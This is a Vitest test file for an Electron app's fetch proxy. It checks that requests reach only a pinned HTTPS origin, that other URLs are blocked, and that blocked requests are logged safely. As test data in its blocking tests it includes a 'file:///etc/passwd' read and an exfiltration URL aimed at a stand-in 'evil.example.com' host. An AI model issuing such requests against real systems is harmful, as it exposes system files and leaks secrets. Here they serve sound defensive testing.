// @vitest-environment node

import { beforeEach, describe, expect, it, vi } from 'vitest';

import { IPC } from '../shared/constants/ipc';

const mockFetch = vi.fn();
const handlers = new Map<string, (...args: unknown[]) => unknown>();

vi.mock('electron', () => ({
  ipcMain: {
    handle: vi.fn((channel: string, handler: (...args: unknown[]) => unknown) => {
      handlers.set(channel, handler);
    }),
  },
  session: {
    fromPartition: vi.fn(() => ({ fetch: mockFetch })),
  },
}));

const ORIGIN = 'https://address-book.example.com';
const EVENT = {};

function okResponse(body = '{"status":"ok"}') {
  return {
    ok: true,
    status: 200,
    statusText: 'OK',
    headers: new Headers({ 'x-csrf-token': 'token' }),
    text: () => Promise.resolve(body),
  };
}

async function setup() {
  vi.resetModules();
  handlers.clear();
  mockFetch.mockReset();
  vi.spyOn(console, 'warn').mockImplementation(() => {});
  const { setupProxy, PROXY_BLOCKED_STATUS_TEXT } = await import('./proxy');
  setupProxy();

  return {
    blockedStatusText: PROXY_BLOCKED_STATUS_TEXT,
    pin: (origin: string | null) => handlers.get(IPC.PROXY.SET_ALLOWED_ORIGIN)!(EVENT, origin),
    fetch: (url: string, init?: RequestInit) => handlers.get(IPC.PROXY.FETCH)!(EVENT, url, init),
  };
}

describe('proxy.ts — fetch proxy policy', () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  it('forwards a request to the pinned origin and returns the response', async () => {
    const proxy = await setup();
    mockFetch.mockResolvedValueOnce(okResponse());
    await proxy.pin(ORIGIN);

    const result = await proxy.fetch(`${ORIGIN}/health`, { method: 'GET' });

    expect(mockFetch).toHaveBeenCalledWith(`${ORIGIN}/health`, {
      method: 'GET',
      headers: undefined,
      body: undefined,
      redirect: 'error',
    });
    expect(result).toEqual({
      ok: true,
      status: 200,
      statusText: 'OK',
      headers: { 'x-csrf-token': 'token' },
      body: '{"status":"ok"}',
    });
  });

  it('blocks file: URLs without touching the network', async () => {
    const proxy = await setup();
    await proxy.pin(ORIGIN);

    const result = await proxy.fetch('file:///etc/passwd');

    expect(mockFetch).not.toHaveBeenCalled();
    expect(result).toEqual({ ok: false, status: 0, statusText: proxy.blockedStatusText, headers: {}, body: '{}' });
    expect(console.warn).toHaveBeenCalledWith(expect.stringContaining('[Security]'));
  });

  it('blocks a non-string url without touching the network', async () => {
    const proxy = await setup();
    await proxy.pin(ORIGIN);

    const result = await proxy.fetch({ toString: () => `${ORIGIN}/health` } as unknown as string);

    expect(mockFetch).not.toHaveBeenCalled();
    expect(result).toMatchObject({ ok: false, status: 0, statusText: proxy.blockedStatusText });
  });

  it('logs only the origin of a blocked url, never its path', async () => {
    const proxy = await setup();
    await proxy.pin(ORIGIN);

    await proxy.fetch('https://evil.example.com/exfil?secret=1');

    expect(console.warn).toHaveBeenCalledWith(expect.stringContaining('https://evil.example.com'));
    expect(console.warn).not.toHaveBeenCalledWith(expect.stringContaining('exfil'));
  });

  it('blocks every request while no origin is pinned', async () => {
    const proxy = await setup();

    const result = await proxy.fetch(`${ORIGIN}/health`);

    expect(mockFetch).not.toHaveBeenCalled();
    expect(result).toMatchObject({ ok: false, status: 0, statusText: proxy.blockedStatusText });
  });

  it('blocks requests to an origin other than the pinned one', async () => {
    const proxy = await setup();
    await proxy.pin(ORIGIN);

    const result = await proxy.fetch('https://evil.example.com/exfil');

    expect(mockFetch).not.toHaveBeenCalled();
    expect(result).toMatchObject({ ok: false, status: 0, statusText: proxy.blockedStatusText });
  });

  it('refuses to pin an origin that fails the scheme rule, keeping the previous pin', async () => {
    const proxy = await setup();
    mockFetch.mockResolvedValue(okResponse());
    await proxy.pin(ORIGIN);

    await proxy.pin('http://address-book.example.com');
    expect(console.warn).toHaveBeenCalledWith(expect.stringContaining('[Security]'));

    await proxy.fetch('http://address-book.example.com/health');
    expect(mockFetch).not.toHaveBeenCalled();

    await proxy.fetch(`${ORIGIN}/health`);
    expect(mockFetch).toHaveBeenCalledTimes(1);
  });

  it('pinning null clears the allow-list', async () => {
    const proxy = await setup();
    await proxy.pin(ORIGIN);
    await proxy.pin(null);

    const result = await proxy.fetch(`${ORIGIN}/health`);

    expect(mockFetch).not.toHaveBeenCalled();
    expect(result).toMatchObject({ statusText: proxy.blockedStatusText });
  });

  it('reports network errors with the error message, not the blocked marker', async () => {
    const proxy = await setup();
    mockFetch.mockRejectedValueOnce(new Error('ECONNREFUSED'));
    await proxy.pin(ORIGIN);

    const result = await proxy.fetch(`${ORIGIN}/health`);

    expect(result).toEqual({ ok: false, status: 0, statusText: 'ECONNREFUSED', headers: {}, body: '{}' });
  });
});
